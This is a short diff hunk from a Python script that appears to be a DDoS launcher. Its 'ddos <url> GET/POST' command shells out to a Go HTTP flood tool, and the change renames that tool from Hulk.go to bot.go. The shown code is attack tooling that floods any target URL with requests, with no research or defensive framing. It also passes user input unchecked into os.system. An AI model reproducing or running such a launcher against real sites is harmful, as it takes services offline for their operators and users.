@@ -64,7 +64,7 @@ def xnln():
 				
 			url = parts[1]
 			method = parts[2]
-			os.system(f'go run Hulk.go -site {url} -data {method}')
+			os.system(f'go run bot.go -site {url} -data {method}')
 		except IndexError:
 			print('Usage: ddos <url> METHODS<GET/POST>')
 			print('Example: ddos http://example.com GET')
